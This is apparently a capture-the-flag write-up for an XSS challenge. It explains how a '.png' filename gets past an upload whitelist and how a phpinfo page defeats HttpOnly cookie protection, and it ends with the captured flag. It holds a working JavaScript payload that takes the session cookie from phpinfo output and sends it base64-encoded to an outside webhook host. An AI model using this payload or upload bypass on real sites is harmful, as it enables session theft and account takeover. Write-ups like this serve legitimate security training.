# XSS 1
`-`

## About the Challenge
We are given a 2 websites (website for testing and bot to get the flag)

## How to Solve?
In the website there is a feature to upload an image file like this

![preview](images/preview.png)

And after we upload a file for example `image.png`, we can access the file by accessing `/uploads/RANDOMCHARACTER/image.png` endpoint. In this chall, we only can upload a file that using `.png` extension. To bypass this whitelist, we need to upload a file named `.png` So the server will read the file as hidden directories.

At first we can get the flag easily and then the admin revise the chall and added more difficulty by adding `HttpOnly` flag on the bot so we need to bypass the `HttpOnly` flag. Luckily there is `phpinfo` file and we can use it to bypass the `HttpOnly` flag. So the payload will look like this

```javascript
var req = new XMLHttpRequest();
req.onload = reqListener;
var url = '[https://REDACTED/info.php](http://172.174.108.207:90/xss1/info.php)';
req.withCredentials = true;
req.open('GET', url, false);
req.send();

function reqListener() {
var req2 = new XMLHttpRequest();
const sess = this.responseText.substring(this.responseText.indexOf('HTTP_COOKIE') + 1 );
req2.open('GET', 'https://webhook/?data=' + btoa(sess), false);
req2.send()
};
```

And then upload the payload and send the file to the bot and we can get the flag

```
0xL4ugh{Fre333e_Plaestine!!_My_bRUH}
```